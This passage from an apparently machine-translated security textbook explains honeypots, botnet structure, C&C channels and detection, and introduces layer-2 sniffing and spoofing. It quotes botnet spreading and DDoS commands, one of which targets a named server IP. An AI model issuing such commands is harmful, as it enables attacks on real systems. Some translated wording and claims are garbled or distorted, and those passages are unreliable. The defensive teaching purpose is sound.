A first advantage that honeypots face over other security techniques is their ease of use. While other techniques of security need to be very familiar with the subject in order to be able to work with it at all, in a honeypot, it is sufficient to install it and make some modifications if necessary. This makes handling a honeypot much easier than with other techniques. Naturally, it also, as mentioned in the previous chapter, requires more complex honeypots that require some prior knowledge. However, initially, a simple honeypot can be run without much prior knowledge. This gives everyone the opportunity to engage with honeypots and to observe attackers. This is not the case with other security techniques.

The next big benefit of honeypots is the amount of data and its associated analysis. Because of the other security techniques, an immense amount of data is collected. The problem here, however, is their recovery. Many of the data collected are not meaningful and are, therefore, unnecessary for analysis. Nevertheless, the security techniques have to record this data because it is not possible to tell in advance which data are important and which are unimportant. This large amount of data sometimes makes it difficult to analyze and process them in a timely manner so that system functions may be degraded in terms of response times. Sometimes even regular system requests are blocked. In contrast, the honeypot limits itself to the data related to the attack in order to subsequently analyze it. This leads to a greatly reduced volume of data, which does not affect the system functions. Evaluating the analysis reveals potential errors within security techniques. Such information can then be used to develop protection mechanisms further. And this is precisely the advantage of honeypots. You have to deal with much fewer data. However, these data are very meaningful, and thus it will be possible to carry out faster and more precise analyses. As a result, there is an opportunity to quickly respond to possible problems or failures in the applied security programs by modifying and improving them.

The third big advantage is the much lower hardware requirement. Since the majority of security programs have the problem of having to cope with the ever-increasing speed of traffic on the Internet with more and more data volume at the same time, correspondingly high demands are placed on the processing speed of the hardware. Failure to do so can lead to difficulties as the safety techniques can no longer control everything and hence can easily cause malfunction. The advantage of honeypots is that they need much fewer resources because they only have to react when they are actually addressed. As a result, a honeypot does not have to be particularly fast or efficient. It is quite possible to use older computers for use as Honeypot. For this reason, honeypots do not have to be brought up to state of the art and are thus very cost-effective to operate.

The next advantage of honeypots is the ability to make everyone aware of the danger posed by the Internet. Since honeypots tell the operator each time an attacker tries to access his system, he is constantly reminded that sufficient protection is required. With other security techniques, there is the possibility of not being aware of this danger, since these programs block off the attacks so that the user is not even brought to the attention of the user. This could lead to the wrong conclusions and tends to suggest that his system is not at risk at all. Honeypots prevent this assumption and explicitly point to the danger.

Disadvantages of Honeypots

The first big drawback honeypots have is the risk they bring with them. A risk exists because a honeypot if an attacker has invaded it, can be used to then out of the network other attack systems. The risk and associated damage depend on the interaction level of the honeypot. As described in the last chapter, the more the honeypot can do it, the bigger the danger.

The next problem, and thus another disadvantage of honeypots, is that a honey pot does not observe what is happening around it, but only what affects itself. As a result, even though there is an attack on the network, the honeypot does not react because it is not itself attacked. Honeypots actually react only when they themselves become the target of the attack.

Another major disadvantage results from the identification of a system as Honeypot. This can lead to an attacker bypassing the honeypot in the future and focusing on other systems. In addition, it can happen that an attacker deliberately uses his knowledge of the existence of a honeypot to access other systems. For example, an attacker can bombard a honeypot with attacks and distract the user to such an extent that he can attack other systems unhindered. In the research honeypots already mentioned, identification can lead to serious errors. This is due to the fact that an attacker can deliberately leave behind false information about himself and his methods during an attack. But as conclusions are drawn from this information through analysis, this leads to wrong conclusions. This poses a massive problem if these failures find their way into the security software of the next version. This way, it can be manipulated, and instead of protecting the systems, new ones can be created.

Examples of Honeypots

The functioning of honeypots has now been explained in detail, so it is time to look at some practical examples. Of course, there are a large number of honeypots in use today. Therefore, in the following three different honeypots are presented, on the basis of which one can see well the different application possibilities. As a first example, I'd like to introduce a rather simple honeypot called Back Officer Friendly. The second example will be a more complex honeypot called honeyd. As the last application, we will then turn to the honeynets.

Back Officer Friendly

The first example I would like to introduce here is Back Officer Friendly (BOF for short). This is one of the simplest honeypots available and can be classified in the class of low-inter-action honeypots. BOF can be used well as a production honeypot and is not suitable as a research honeypot. The reason is that the program has very limited functionality and, in the case of an attack, also collects very little information about the attacker and his methods. But before the functionality is explained in more detail, first a few words about the genesis of BOF.

BOF, which was initially not conceived as a honeypot, was actually developed as a measure against a then-circulating program called Back Orifice. Back Orifice was, therefore, such a great danger because an attacker could penetrate without attracting attention into a system and could control this at will. When Marcus Ranum developed BOF in 1998, his goal was to create software that would uncover the activities of this then-widespread program. BOF was designed to immediately trigger an alarm once a Back Orifice attack was discovered.

The procedure of the BOF can be described as follows: The program can listen to up to 7 different ports of a system. If an attempt is made to establish a connection to one of these ports, BOF actually establishes a complete TCP connection, at the same time recording the attempt to set up the connection and triggering an alarm to alert the user. Then BOF breaks off the connection immediately. As can easily be seen, BOF can gather very little information because the program immediately terminates the connection immediately after setup.

Although BOF has very limited functionality, the program is well suited to detect attacks on a system and thus to find a good way of failing security. In this way, companies can also be made aware that there is a security risk and thus, awareness of the need for security measures.

Honeyd

Honeyd was developed by Niels Provos and published in 2002\. This program is an open-source system intended for Unix systems. The fact that the program is free of charge and therefore not only easy to download by anyone, but also that every access to the source code has immense advantages. It can be developed very quickly because everyone can work on the code. Thus, the program offers the possibility to integrate new functions or to fix errors.

Despite its extensions, Honeyd can still be assigned to low-interaction honeypots, as it is relatively easy to use. Furthermore, Honeyd is designed as a production honeypot but is also suitable in parts as a research honeypot. The possibility of using it as a research honeypot is because Honeyd makes certain applications useful for research purposes.

The peculiarities underlying this program, on the one hand, are that it can monitor every possible TCP port. Honeyd does not register the activities on its own ports but assumes the identity of an IP address behind which no real system is located. Thus, in the case of an attack, it can simulate the addressed system and, as this replicated system, interact with the attacker to gain information therefrom. But Honeyd can simulate not only one but extremely many systems. And this is exactly the second special feature that Honeyd offers.

Since Honeyd only simulates a system in a network when there is no real system behind it, the question arises of where the information is obtained from. It must therefore first be clarified behind which IP address a real system stands and behind which not. If there is no real system behind an IP address and this is addressed, then it is assumed that this is an attack and Honeyd intervenes. There are two ways of detecting non-existent systems. The first is when a network or part of the network is not even used. Then there is no real IP behind any IP address, and Honeyd uses a procedure called blackholing. This method offers the ability to listen to whole blocks instead of individual IP addresses, saving a lot of time and complexity. The second option, which is used much more frequently, is used when both real and non-existent systems co-exist in a network. In order to find out the IP addresses in such a network where there is no real system behind it, the address resolution protocol, ARP for short, is used. This protocol makes it possible to determine the MAC address (Media Access Control) behind the IP address. If this MAC address does not exist, there is no system. This allows you to quickly and easily separate the two traps.

If you try to connect to a port that does not have a real system behind it, Honeyd pretends to be one instead and interacts with the attacker according to the system.

Honeynets

The last example that I would like to introduce at this point is the most important and powerful thing. The concept of Honeynets was first introduced in 1999 as part of a paper titled "To Build a Honeypot." For the first time, it was the idea to use a normal network as it happens in every company as a honeypot. When the Honeynet Project was founded in 2000, the honeynets took on the central role in the investigation of cyber attackers. The project used Honeynets to gather information about attackers and their methods. The result of their work is a series of papers that later appeared as a book entitled "Know Your Enemy" in a collected form.

The honeynets can be clearly assigned to the high-interaction honeypots because there are no restrictions in connection with the interaction between honeynet and attacker. The idea of a honeynet is to build a normal real network, as is customary in business. This network is followed by a barrier called Honeywall. Then it's easy to see what's going on because otherwise, this physical network serves no other purpose within the network architecture. The design of the network and the individual applications on the systems are completely freely selectable and make the Honeynet extremely flexible. So honeynets are set to take the concept of honeypots to a higher level, but the underlying idea is the same. These honeynets are seen as an evolution of honeypots.

Honeynets can thus be used both as a producer and as a research honeypot. The decision to use a honeynet as a production honeypot has the reason that a honeynet can deal very well with known as well as unknown attack patterns and thus detect attacks that would otherwise remain undetected. As a result, excesses can be detected and reported with a high degree of probability, which in turn provides the company with good protection. However, a honeynet is rarely used as a production honeypot because it is simply too complex, expensive, and expensive.

However, good application possibilities are available to Honeynet as a research honeypot. This is mainly because they can gather a great deal of information during an attack. These not only consist of data about the attacker himself but also about the methods and tools he uses. The advantage of a honeynet is that an attacker does not even notice that he has invaded a honeynet. Because it's built just like any other network, the attacker simply does not recognize the difference. Once it has penetrated into a honeynet, it stores all the action and functionality of the tools used without the attacker noticing. This makes the use of honeynets so effective. The valuable information can be used to carry out very good analyzes, with which trends and patterns can be found. Thus it is even possible to make predictions about attack behavior or to warn against attack at an early stage. In addition, honeynets can be used to test new security techniques. The only thing you have to do is install the new security method on a honeynet and see if it can be broken in case of an attack.

Future of Honeypots

Although honeypots have been on the market for quite some time, the acceptance is not very big. One of the underlying problems is that you still do not agree on how to define a honeypot. Since companies do not know exactly what benefit they can expect from the use of a honeypot, they do not deal with it at all. Therefore, the most important task is to work out the strongest of the honeypots, so that companies recognize the advantage of honeypots and use them in their favor. As a result, acceptance will certainly increase, and the benefits of further development by security experts will rise sharply, which in turn favors the development of honeypots.

Unfortunately, the lack of unity over the definition is not the only problem of Ho-neypots. Another disadvantage is the still relatively heavy operation. Today's honeypots, and especially research honeypots, usually have an unmanageable operating surface, making the operation of such a honeypot very difficult and complex. Difficult handling also automatically results in greater error liability due to misadjustment by the user. Furthermore, with a honeypot, it is not yet possible to communicate with other security techniques. If there is an attack on a honeypot, it detects and registers it, but the information is not forwarded to other security programs. Through a corresponding interaction between Honeypot and security techniques, further attacks could be avoided quickly and without much effort. In the future, these problems could be eliminated by further development of Honeypot.

One prediction, which is also presented in the book by Lance Spitzner, is that honey-pots and especially research honeypots still have a lot of potentials. With the development so far, only approaches to future applications have been made. A possible use of honeypots could be to detect patterns at attacks. Thus, by analyzing the collected information, possible patterns could be identified to warn against attackers at an early stage. Another application is the specialization for attackers who are looking for highly sensitive data. A possible goal is also that honeypots no longer work on their own, but cooperation between several honeypots distributed around the world are closed. The advantage is that the data collected by each honeypot are analyzed together to make it much more accurate. As a result, there are better protection mechanisms.

> Chapter 13 – Botnets

The phenomenon of botnets is the basis for a multitude of Internet threats such as spam and denial-of-service. This section provides an overview of how botnets work by presenting the basic elements and features of a botnet and its features. Different methods for opening, analyzing, and stopping productive botnets are explained.

Introduction

The steady growth of the Internet is accompanied by an increase in criminal and destructive energies, ranging from purely destructive vandalism to organized crime. The well-known but little explored field of botnets is the starting point of many critical malicious mechanisms such as spam, Distributed Denial of Service (DDoS), and data espionage.

Vinton Cerf proposed at the World Economic Forum in 2007 that all PCs connected to the Internet are part of a malicious botnet [Foru07]. Nevertheless, the previous safety-related approaches focus on preventing, filtering, and averting the attacks caused by botnets. Only a few approaches deal directly with the basis and functioning of the botnets.

Botnets – Definition and Delimitation

A botnet is a group of individual computer systems that have been infected with malware without the user's knowledge and remotely controlled by a single individual. The infected end system is called zombie or bot, more rarely drone. The individual remotely controlling the botnet is called a botmaster. The C & C channel (Command and Control) has become established as the term for the communication channel between Botmaster and botnet [RZMT06].

A 1: n communication between Botmaster and Bots over a C & C channel is the basic defining feature of a botnet. In addition, " botnets " are only those structures whose intended purpose is to carry out harmful and criminal acts. After all, botnets are just a tool that can, but does not have to, do harm.

Structures of a similar nature, such as " Folding@home " or "Mersenne Prime Search," are peaceful and meaningful services that are not classified as botnets.

The evil bots to be found today evolved from the classic IRC bots of the early 1990s. Eggdrop was one of the first such bots to support the IRC user in chat by performing functions such as database queries or offering help. Based on the modularity of Eggdrop, first bot programs were developed that could be used to implement evil intentions. However, the first attacks are limited to DoS in the IRC sector, for example, through automated " flooding." These bots have evolved over time, but the modularity of egg-drop and control over IRC have been retained [CoJM06].

In the meantime, botnets are being used for pure vandalism ( " script kiddie ") as well as for commercial fraud, extortion, spam, and phishing [CoJM06]. It also identifies a community that works closely together to develop and develop malware. If the source code of the bots is publicly available, they show a large number of user signatures in the form of scene-specific pseudonyms. Code is often reused; the source code contains comments that specify the original source code source. Often, these are pre-existing malicious software such as computer viruses, worms, or Trojans.

Common Botnet Systems

The classification of the existing bots is difficult. Existing Bot software is often rewritten several times, expanded and modified; sometimes up to 4,000 versions of a bot variant are known (SDBot and Agobot). Here is a selection of the most widely-received and currently popular bot groups listed:

Agobot/Phatbot/Forbot/XtremBot

The core of almost all common bots is Agobot, first released in 2004, and its programmer was arrested in the same year. The bot is written in C ++ and offers a modular and abstract software architecture. The source code is released under the GPL, although no central reference source is available. Agobot has been expanded several times over the years, with the current source code package, with all modules, extensions, additional tools, and alternative implementations, having a size of around 140 MB. Agobot uses libpcap [BHKW05] to listen for network traffic and provides support for PCRE (Perl Compatible Regular Expressions) and NTFS ADS (Alternate Data Streams) as well as functions of a classic rootkit. New versions are able to prevent the reading of C & C parameters by detecting debuggers and virtual machines such as SoftICE or VMware [BHKW05]. Agobot provides encryption of C & C communication with SSL and is available in a special version for infecting Linux systems [CoJM06].

SDBot/RBot/RBot-GR

SDBot and derivatives are written in C and published under the GPL. The source code is small and concise, albeit with little abstraction and no modularity support. Damage functions are not implemented in the basic system, only basic functions for processing the C & C commands are available. The addition of malicious functions requires only minimal modification of the source code. SDBot also uses backgrounds left behind by other malware for primary infection, in addition to vulnerabilities in Windows operating systems and peer-to-peer software [CoJM06]. More than 4,000 variations are known. The meanwhile reworked source code allows conclusions to be drawn to the authorship of more than 100 programmers.

Storm Worm/CME-711/Troj.Dorf/Win32.Nuwar

With a footprint of an estimated 1 million infected systems, the Storm botnet is the largest ever observed. The anatomy of the associated bots software CME-711 is little researched, unambiguously assignable source codes are not openly accessible. The electricity botnet was responsible during 2007 for various DDoS attacks of commercial interest, which were reported in the trade media.

Clickbot

A clickbot is or was a commercially available or rentable yet illegal and harmful botnet system. The botnet with a footprint of 100,000 bots was discovered in May 2006\. Google invested considerable research effort in analyzing the botnet in order to be able to use an effective filter for click simulation.

The bot was as a BHO (Browser Helper Object) for "Microsoft Internet Explorer" implemented, as C & C channel served HTTP. The dissemination of the Bot software took place by means of "Social Engineering" and by exploiting security gaps in the software "Microsoft Internet Explorer." The administration took place via a decentralized administration system written in PHP with MySQL as a backend. The source code of the administration system could be confiscated and was published [DaSt07].

Operation

The lifecycle of a bot system can be divided into several phases and roles. After importing into the victim system (primary infection), the actual bot software (secondary infection) is reloaded, after which contact is made to the Botmaster via a C & C channel, whose commands are then implemented.

Intake into the Victim System

The acquisition of new victim systems is not uncontrolled in the environment of botnets as with conventional computer viruses. As a rule, existing bots are instructed by a botmaster to locate and infect new victim systems. It exploits security gaps in the victim's system.

The distribution mechanism of botnets is one of the main causes of " background noise " (network traffic caused by malware network scanners) on the Internet, which is mainly at ports 445/TCP, 139/TCP, 137/UDP, and 135/TCP occurs. According to the " Honeynet Project," 80% of the measured passive network traffic is accounted for by an average internet connection for these end ports [BHKW05]. Connected to this are known security vulnerabilities of the operating system " Micro-soft Windows " in the versions NT to XP. Common sources of attack are also security vulnerabilities in network games, in peer-to-peer programs, and in email clients. In addition, it can be observed that bots exploit the functions of other malware in order to install themselves on the victim system [CoJM06]. In addition to the exploitation of security gaps, methods of " social engineering " are used as well as the order for export.

Typically, an infected system executes a download immediately. The URL of the download is given either directly or indirectly in the binary file of the primary infection. Common protocols include Trivial File Transfer Protocol (TFTP ), File Transfer Protocol (FTP, [PoRe85]), Hypertext Transfer Protocol (HTTP, [FGMF + 99]) or CSend, a protocol for sending files IRC users. The latter is particularly useful in the context of IRC as a C & C channel. The software used to infect the system usually does not yet have functionality for participation in a botnet [RZMT06]. After downloading, the downloaded binary file is executed and registered in the operating system so that it is automatically started at system startup. Typically, existing bots serve as servers for these secondary "binary files" [RZMT06]; in some cases compromised web servers or free providers of web space are also abused in other ways [BHKW05].

Agobot contains, for example, after the primary infection, only 40 so-called "Commands," which it can export remotely. These only cover the areas of communication via IRC and the downloading of additional components. Thus any damage function must be added afterward by the secondary binary package.

The development of Agobot, known as Phatbot, also offers after the Primarinfektion¨ functions for exports of DDoS attacks and Ausspahen data. The binary file can thus be preconfigured to execute harmful activities without the need for a control command from a C & C channel.

C & C channel

Various protocols are used as the C & C channel to control the bots. Widely established is the IRC protocol. The proliferation of peer-to-peer systems, which can also contain freely definable instructions in the form of chat specifications, also makes protocols such as e2k, Gnutella, or FastTrack popular.

Occasionally, the modular structure of the bot programs allows access to a variety of different protocols. The 2003 SDbot was able to use not only IRC but also established peer-to-peer protocols as C & C channel [CoJM06].

IRC

Despite recent developments, communication via IRC is the most widely used communication channel. This is facilitated by the flexibility of the protocol and the availability of free implementations that can be used to program the malware.

In the typical scenario, the botmaster operates an IRC channel on a server to which the bots connect automatically. The IRC channel is mostly password protected. User name, password, channel name, and address of the server are permanently integrated into the binary malware. In most cases, dynamic URIs are used to change the server when needed.

To successfully connect to the IRC channel, a username formed according to a special algorithm, as well as the correct transmission of the password via the IRC- specific PASS command [RZMT06]. The IRC protocol does not provide any encryption, so all access data can be obtained from other network sniffing.

After successful authentication, the IRC server sends the messages to the bot

RPL_ISUPPORT , RPL_MOTDSTART , RPL_MOTD , RPL_ENDOFMOTD, and ERR_NOMOTD [OiRe93] , respectively. RPL_MOTD can already transmit commands to the bot without this one entering the channel. For example, a new channel name or an alternative server can be specified.

The bot parses after entering RPL_TOPIC and executes the command immediately. RPL_TOPIC follows in the common bots a simple syntax consisting of a method name and parameters.

An RPL_TOPIC of shape .advscan lsass 200 5 0 -r -s instructs the bots, for example, to continue to spread themselves through the LSASS security gap by searching for threads with a delay of 5 seconds without time limit (0) for vulnerable victims [BHKW05].

At the beginning of the 1990s, public ICR channels were used as the C & C channel. For the administrators of public IRC servers, abuse of this kind was a significant security risk. The use of filters and other analytical methods was widespread. However, modern observations show that current botnets use almost exclusively individually modified IRC server software. This modified IRCd typically do not adhere to the properties specified in RFC 1459 [OiRe93]. In order to make the number of bots in the botnet inaccessible to drones, as a rule, no user list is output, as required in the specification of the IRC protocol [BHKW05]. For the communication, unnecessary subsets of the specification are removed. Especially the IRCd "unrealircd," which is popular because of the free availability of its sources, is heavily modified for use as a C & C channel. In relevant peer-to-peer networks, versions of the IRCd have emerged that allow up to 80,000 users and thus 80,000 bots per channel [BHKW05]. This performance is achieved by omitting broadcast messages for JOIN, PART and QUIT. In addition, the mandatory messages LUSERS and RPL_ISUPPORT according to the specification [OiRe93] are not implemented in order to make the external analysis of the C & C channel more difficult. It was also possible to observe the additional implementation of mechanisms for securing the botnet. For example, the modified IRCd only allows usernames of specific syntaxes or from a specific network area [BHKW05].

Recent observations also show that current botnets introduce additional encryption and security mechanisms, so the IRC channel only serves as a tunnel [Netw07]. The control of a botnet via an IRC channel is a central type of communication. If this central interface is compromised, the botnet is no longer commandable. From the point of view of attack defense, this is an advantage. From the point of view of the botmaster, this central deployment results in a low latency of communication. The Botmaster has control over the IRC server, which is not the case with a decentralized approach [CoJM06].

P2P

The use of peer-to-peer networks as a C & C channel, in contrast to the classical approach of the IRC channel, pursues a decentralized strategy. The communication over P2P systems is generally not to be interrupted or compromised even with great effort. Tracking traffic is complex. The disadvantages of Botmaster's view are the indeterministic nature of the channel and the lack of control. For P2P systems, there are already mechanisms for anonymizing the traffic that can be used by the Botmaster [CoJM06]. P2P systems as a C & C channel are poorly discussed in the literature.

HTTP

In particular, bots systems optimized for exporting harmful actions on the WWW (such as simulating clicks on commercial ads, manipulation of Internet casinos and web games) use HTTP as the C & C channel. Examples are "Clickmaster" and "Clickbot.A" [DaSt07]. They are usually as BHO (Browser Helper Objects) of the software " Microsoft Internet Explorer implemented." By integrating with the web browser, BHOs have access to WWW resources without much implementation effort.

Indeterministic Communication

Following the example of existing fully centralized P2P systems, it would also be possible to have completely decentralized communication between the bots that take place without the use of all-common and specified protocols. In this scenario, a bot could actively scan for additional members of its network and send encrypted messages to those found bots. The latency is very high. A system of this kind could not yet be observed in the productive form [CoJM06].

Command Translation

The transmission of Botmaster commands to the individual bots takes place in a syntax that cannot be specified in general terms. General statements about their shape cannot be made. The popular Agobot uses the syntax form.

. <command_class> [. <subcommand>] <parameter> * .

That's the order of the command.

.ddos.syn 129.13.182.1 21 200

Bots attack the University of Karlsruhe web server on Port 21 for 200 seconds with DoS attacks.

Application And Command Classes

Botnets are first and foremost, a tool that can be used as a basis for executing potentially criminal and harmful actions. Briefly, the various hazard potentials should be considered in the order of their frequency:

dDoS

The " Distributed Denial Of Service " is the most common threat posed by botnets. According to surveys by [Netw07], 71% of all observed botnets are in dDoS attacks. In this case, a botmaster commands all bots to send excessive network traffic to a defined destination. The attacked server is unable to properly service its services due to a large number of requests. Investigations show that the majority of attacks from botnets are currently over UDP. The attacks at the application layer or at TCP are lagging behind [Netw07]. DDoS is thus the primary threat posed by botnets and only botnets.

Spamming

64% of all observed botnets send email spam [Netw07]. This usually works over a SOCKS v4 / v5 proxy [LGLK + 96] on the compromised system [BHKW05]. Ago-bot is also capable of building a Cisco Systems' Generic Routing Encapsulation (HLFT94) tunnel, which makes it easy to encapsulate email protocols [CoJM06]. 34% of all observed botnets were able to provide such open proxies for sending spam email and other activities [Netw07].

Data Theft

Some bots are able to aggregate information from the victim's system like classic Trojan horses and send it to the botmaster. These are, in particular, email addresses stored on the system, passwords, and other identity data (16% of botnets [Netw07]). In addition, botnets provide various elements for phishing (37% of all botnets).

Miscellaneous

Because botnets have a variety of different IP addresses from the regular Internet Service Provider (ISP) pool, botnets are increasingly being used for commercial fraud. The main providers here are providers of online advertising (such as Google AdSense [DaSt07]). In this case, the bots generate virtual clicks on the advertisements of commercial providers. Online voting vendors, online games, and more commercial Internet casinos and poker game providers are also finding this type of fraud [Netw07].

In addition, botnets have often been the starting point for spreading re-gular malware in the past.

Tracking Botnets

Virus Scanner

Recognition of the bot software on a victim system follows the same strategies that are used for other malicious software. All commercial virus scanners are able to detect and delete known bot software. This known method will not be discussed further here.

Honeypots/-nets and Malware-Collection

A controlled install potentially infected victim systems and analyzing the infection then occurs in the broadest sense as malware Collection means Honeypots, respectively. If an entire network of such honeypots is available at the moment, one speaks of honeynets [BHKW05]. The use and operation of honeypots/networks are complex and complex and should not be dealt with here.

Malware collection generally refers to the isolation of malware, especially bot software. In both approaches, it is important to isolate the C & C channel; if necessary, with the necessary parameters for login and communication locking. This is done either by listening to the network traffic generated by an infected system or by analyzing the binary file. In particular, since the log in via IRC generally takes place without encryption, the login parameters are generally easy to win [BHKW05].

Drones

Controllable software that simulates the behavior of bots in a botnet to aggregate information is called a drone. That drone software is used to analyze the size of botnets.

IRC-Based Detection of Botnets

By using filters, potential IRC C & C channels can be found. A simple method is to filter network traffic on TCP port 6667 for known botnet commands. However, it has to be noted that the commands in different botnets are very variable and that ports other than port 6667 can be used [CoJM06].

Another method is to search for characteristic patterns in IRC communication. As a rule, bots are “dumb” for a long time, then respond quickly and in large numbers to a command from the botmaster. These answers are faster than those of a human user. Systems of this type are generally successful in finding botnets but suffer from a high error rate [Raci04]. However, general and general characteristics of botnet communication via IRC are not apparent [CoJM06].

Combinations and Data Mining

All hitherto known systems for the detection of botnets suffer from a high failure rate. Either a small class of botnets can be detected a priori or the detection density is very low. New approaches suggest a combination of different approaches.

Existing data can be analyzed for characteristic properties and characteristics of a botnet. Features include the increased volume of scanning of otherwise unused TCP ports, the reading out and analysis of DNS caches as well as the analysis of sent binary files of known Bot software. A combination of these methods can be used for a comprehensive warning system [CoJM06].

Analysis Factor Botnet Size

Whereas botnets containing between 80,000 and 140,000 bots were classified as dangerous in the past, reports in recent years have warned against small botnets containing a few hundred bots [Netw07]. The large botnets in the form of an estimate of the average active bots are, therefore, an important characteristic in order to be able to assess the danger potential of a messenger network.

The development of smaller botnets has several reasons. First, small botnets are more likely to be detected by more robust security software than they would be with large botnets. Small botnets, therefore, have a higher market value in the impacting scene and can be more easily leased or sold [CoJM06]. The move to broadband connections for home PCs also eliminates the need to acquire several thousand bots. With an average wired Internet connection at about 1Mbps upload speed, only a few hundred bots are needed to reach the capacity of an OC3 (155Mbps) link. An attacker's effective dDoS attack is thus already possible with fewer than 200 bots.

Nevertheless, the evaluation of botnet size remains a controversial subject of current research. Dagon et al. investigated the botnets of an alleged large number of 350 000 active bots [DaZL06]. Rajab considers botnets with a size of fewer than 1,000 bots to be potentially dangerous [RZMT06].

Definitions on Botnet Size

The size of a botnet is the most important characteristic feature, but there is general disagreement about how to define this greatness. One problem with determining largely observed botnets is the distinction between active and passive bots. Active bots usually account for only 5-10% of the total number of bots [RZMT07]. The parameter of the size of the botnet is always directly related to the measuring method used, the related side effects, and context.

In addition, the size of a botnet does not make any statement about the danger posed by the botnet. Moreover, the division into passive and active bots is not clearly defined and is difficult to access in the established measuring methods.

Therefore, two definitions have been established in the literature. The footprint of a botnet indicates the potential Gesamtgrobe of a botnet at a given time point. All infected systems whose bots software is configured to join the observed botnet will be paid. This parameter provides information about the distribution rate of the messenger network and about the effectivity of the dissemination mechanism. The footprint of a botnet is time-variable and depends on the daily spread and countermeasures used by the affected systems [RZMT07]. An alternative term for the footprint is the number of passive and active bots.

The second definition gives an indication of the active population ( live population ). This parameter describes the number of directly available bots that can be retrieved at a given time via the C & C channel. Thus, based on the size of the population, a statement can be made about the potential danger of a botnet. A statement about its distribution cannot be derived [RZMT07]. An alternative name is the number of active bots.

Methods for Estimating The Botnet Big

Different ways of determining these variables are the subject of research:

Infiltration

Infiltration is a collection of techniques in which the observer connects himself to the C & C channel to read Botmaster commands. This technique also makes it possible to identify the target of a dDoS attack even before it actually starts.

Specialized tools for this task exist only for the IRC protocol as a C & C channel and allow the observer to be slipped into a botnet as a drone. "IRC Tracker" [RZMT06] created using the IRC access data that are extracted from the binary file of the primary infection, connects to the C & C-channel. The software claims to have high computing power and high bandwidth. In particular, because the source code of Agobot and SDBot is freely accessible, IRC Tracker also offers a simulation of the condition-dependent answers of regular bots. He is also able to offer a SOCKS v4 proxy. "Drone" provides a clear architecture to adapt the software to a modified IRCd [BHKW05]. Both software creates log files of all commands in the IRC chat.

When calculating the actual population, it is not enough to pay the number of unique user IDs. In observations of several botnets, a ratio between the unique user name of the bot and the clear IP address of the bot could be determined on the average 1: 3 [RZMT07]. This ratio is primarily due to the multithreading capability of the Bot software. Agobot and derivatives provide a clone function that generates as many instances of the bot software on the victim system. Thus, it is possible for the botmaster to generate multiple bot instances for a single botnet, but also to integrate a victim system into multiple botnets. Thus, the botnets are usually not disjoint [RZMT07]. Occasionally it was observed how botmasters exchange bots or " steal " each other [BHKW05]. The parameter of the population must therefore also be based on an estimate if there are accurate and complete log files of the C & C channel.

DNS Forwarding

Dagon et al. developed an alternative method based on the manipulation of the DNS entry of the IRC server [DaZL06]. This method is applicable if the access data within the binary file on the victim system is not in the form of fixed IP addresses but as a dynamic domain name. By changing the DNS entry of the C & C channel from an authorized site, the connection of the bots can be redirected to a separate server. This own server accepts all TCP connections and logs the IP addresses. This method only allows the parameter of the footprint to be determined with precision and without any estimation. Information about the active population cannot be given.

However, a botmaster can easily detect the redirection of the DNS entry and use the update function of the bots that are still under its control to restructure the botnet [RZMT07]. The method of DNS forwarding serves only to determine the size of the footprint. Information about the botnet's activities, especially transient and future dDoS attacks, cannot be collected.

Analysis of DNS Caches

Information from the botnet itself is not always possible due to the increased volume of modified IRCd and the switch to alternative and largely unexplored C & C channels. Nevertheless, external data not coming from the immediate environment of the botnet can be used to derive information about its characteristics.

One way to do this is to parse cache data from a DNS server [RZMT06]. A bot will, under normal circumstances, perform a DNS query to join the C & C channel. This query is independent of the protocol of the C & C channel. For analysis, the target address to be interrogated is extracted from a captured binary file of the Botsoftware. At regular intervals, with multiple DNS servers, the resource may be checked for presence in the DNS cache. A cache hit implies that at least one bot in the TTL interval of the DNS cache has attempted to log in to the C & C channel. So, the size of the footprint can be appreciated. Derivatives of population size are not possible. In order to make a reliable estimate possible, it is necessary to query a large number of DNS servers.

Challenge of Botnet Destruction

Stopping recognized and analyzed botnets are generally difficult, and it's only a little researched. In individual cases, it could be observed that hostile Botmaster itself based on overcoming traditional security mechanisms, can also be used to stop malicious botnets. In the case of a central C & C channel, disabling the central site is a secure way to destroy the botnet. Immediate termination of all addresses known to the botnet by C & C parameters leads to an immediate stop of the entire botnet. In practice, this is possible through the police seizure of servers. Alternative and long-term options are unknown.

> Chapter 14 – Sniffing and Spoofing: Attack on Layer 2

The purpose of this section is to illustrate the key characteristics of the methods " sniffing " and " spoofing " and their relevance to attacks on layer 2 and 3 network protocols. It also describes ways of detecting such attacks and possible countermeasures by a network administrator. This should enable users to protect themselves from such attacks and possible damage better.

Introduction

The common model of communication in computer networks is the ISO/OSI layer model, a hierarchical communication model for heterogeneous computer networks [Tane03]. Each of the layers conceals all underlying layers and provides the upper one with a well-defined interface, which provides methods for network communication. If one of the layers in this model can be compromised, the integrity of the overlying layers is also affected.

The possibilities of attacking data transmission on the lower layers are manifold and sometimes not very complex. In order to be able to represent them and to explain possible countermeasures, we first briefly review the structure of the ISO / OSI model. In addition, the functioning of the most important protocols will be explained, as well as the fundamental weaknesses of hierarchical communication models. Subsequently, the terms " sniffing " and " spoofing " are stated. Then, we describe the specific methods that attackers can use to compromise the security of network systems; after which, it is explained which continuative approaches are possible using the recorded data. Finally, we discuss further approaches that are based on sniffing and spoofing techniques.

Layer 1 to 4 in the ISO/OSI model

To enable communication between two applications executing on different computer systems, a number of different hardware and software components are required. In particular, network adapters, drivers, software libraries, and parts of the applications pay for themselves. Starting with the physical signal transmission via the decoding and forwarding of the signals up to the application, a hierarchical communication process can be identified, which is the OSI model. This model describes the individual layers by which the various components of their functionality and their tasks are classified.

Components of a layer typically access the services and methods provided by the underlying layer to accomplish their task, and in turn, provide various services to the components of the next layer. Each of the layers hides their implementation details before the next layer, and at the same time can transparently communicate the underlying layer with its counterpart on a remote computer system. Thus, between two equal layers on different systems, there is virtual horizontal communication, i.e., data exchange between like components on different systems, whereas where the actual communication is vertical with the underlying layer. Only at the lowest level of signal transmission does real physical horizontal communication occur.

This unified modeling enables communication even in heterogeneous environment exercises, i.e., involving various transmission technologies, operating systems, and applications. If one identifies the transmitter and receiver as an application, then the layers 1-4 are of prime importance, since here, the distribution, switching, and the physical transfer of data takes place. The layers 5 - 7 play a role within the computer system of transmitter and receiver itself.

Due to the high complexity of uninterpreted electrical signals, the 1st layer does not represent a practical starting point. From layer 2, the data are already available in digital form and can be read and evaluated by programs and users and possibly even modified. So even if an attacker accesses Layer 1 data, that is, when receiving electrical or optical signals, it must first be transmitted to layer 2 by decoding to allow for analysis.

Functioning of the Individual Protocols

The description of functionality given here is limited to the security-relevant aspects of the protocols and does not claim to be complete. More detailed descriptions can be found in the individual sources.

